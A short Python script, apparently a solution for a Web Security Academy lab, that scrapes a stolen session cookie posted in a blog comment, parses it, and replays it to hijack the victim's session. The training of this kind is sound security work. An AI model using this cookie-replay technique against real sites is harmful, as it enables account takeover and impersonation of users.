import requests
from bs4 import BeautifulSoup
import re
s = requests.Session()
site = 'ac681f1f1ff4127d80a2393500bd0027.web-security-academy.net'

post_url = f'https://{site}/post?postId=1'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
cookie_list = soup.find('p', text=re.compile('secret')).text.split(';')
print(cookie_list)

cookie_dict = dict()
for cookie in cookie_list:
    c = cookie.split('=')
    cookie_dict[c[0]] = c[1]
print(cookie_dict)
resp = s.get(f'https://{site}',cookies=cookie_dict)